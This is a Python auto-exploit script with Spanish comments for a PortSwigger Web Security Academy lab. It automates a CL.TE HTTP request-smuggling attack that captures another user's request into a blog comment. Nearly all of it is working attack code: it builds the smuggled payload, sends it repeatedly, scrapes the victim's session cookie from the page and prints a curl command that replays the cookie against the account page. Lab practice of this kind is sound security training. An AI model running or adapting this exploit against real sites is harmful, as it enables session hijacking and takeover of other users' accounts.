#!/usr/bin/env python3
"""Auto-exploit del lab PortSwigger 'capture other users requests'.

Manda el smuggle CL.TE en loop, espera a la victima, parsea los comments
y extrae la session cookie cuando aparece un User-Agent con 'Victim'.
"""
import ssl
import socket
import time
import re
import urllib.request

# ===== Config (sustituir con valores actuales del lab) =====
LAB_HOST = "0a59003e03b985ed8007530a00c60024.web-security-academy.net"
SESSION  = "gBNS3CXZBSDnlbVzu85nUEyPMFz4nmi0"
CSRF     = "9QNnqxQ8y9KiwOVuUBHYpRok266yH3w9"
POST_ID  = "7"
CL_INNER = 1000       # bytes a absorber del proximo request
WAIT     = 25         # segundos a esperar entre smuggle y fetch
MAX_ATTEMPTS = 30

def build_payload():
    # Estructura oficial: outer a /, smuggled a /post/comment, sin Host en smuggled
    smuggled_body = (
        f"csrf={CSRF}&postId={POST_ID}&name=Carlos+Montoya"
        f"&email=carlos%40normal-user.net&website=&comment=test"
    )
    smuggled = (
        f"POST /post/comment HTTP/1.1\r\n"
        f"Cookie: session={SESSION}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {CL_INNER}\r\n"
        f"\r\n"
        f"{smuggled_body}"
    )
    outer_body = f"0\r\n\r\n{smuggled}"
    outer = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {LAB_HOST}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(outer_body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{outer_body}"
    )
    return outer.encode()

def send_smuggle(payload):
    ctx = ssl.create_default_context()
    with socket.create_connection((LAB_HOST, 443), timeout=10) as s:
        with ctx.wrap_socket(s, server_hostname=LAB_HOST) as ss:
            ss.sendall(payload)
            ss.settimeout(3)
            try:
                resp = ss.recv(4096)
                return resp.split(b"\r\n", 1)[0].decode(errors="replace")
            except socket.timeout:
                return "(timeout reading response)"

def fetch_post():
    req = urllib.request.Request(
        f"https://{LAB_HOST}/post?postId={POST_ID}",
        headers={"Cookie": f"session={SESSION}"},
    )
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.read().decode("utf-8", errors="replace")

def find_victim_cookie(html):
    """Itera TODOS los <p>...</p> con 'Victim'. Prefiere el que tenga cookie.

    Skip bloques con marcadores de test fake (AAAAAA, _FULL32, _END_MARKER).
    """
    blocks = re.findall(r"<p>(.*?)</p>", html, re.DOTALL)
    fallback = None
    for block in blocks:
        if "Victim" not in block:
            continue
        # filtrar contaminación de tests previos
        if "AAAAAAAA" in block or "_FULL32" in block or "_END_MARKER" in block:
            continue
        m = re.search(r"\bsession=([A-Za-z0-9_\-+/=]{20,})", block, re.IGNORECASE)
        if m:
            return m.group(1), block
        fallback = block
    return None, fallback

def main():
    payload = build_payload()
    outer_cl = len(payload) - payload.find(b"\r\n\r\n") - 4
    print(f"[+] Outer CL: {outer_cl} | Inner CL: {CL_INNER}")

    for i in range(1, MAX_ATTEMPTS + 1):
        print(f"\n[{i}/{MAX_ATTEMPTS}] enviando smuggle...")
        try:
            status = send_smuggle(payload)
            print(f"    response status line: {status}")
        except Exception as e:
            print(f"    send error: {e}")
            time.sleep(5); continue

        print(f"    esperando {WAIT}s a la victima...")
        time.sleep(WAIT)

        try:
            html = fetch_post()
        except Exception as e:
            print(f"    fetch error: {e}")
            continue

        cookie, block = find_victim_cookie(html)
        if cookie:
            print(f"\n[+] BINGO. Victim session cookie: {cookie}")
            print(f"\nUsalo: curl -b 'session={cookie}' https://{LAB_HOST}/my-account")
            return cookie
        elif block:
            print(f"    captura de Victim sin cookie visible (CL_INNER bajo o regex):")
            print(f"    --- bloque completo ({len(block)} chars) ---")
            print(f"    {block[:2000]!r}")
            print(f"    --- fin bloque ---")
        else:
            print(f"    sin captura de Victim aun")

if __name__ == "__main__":
    main()
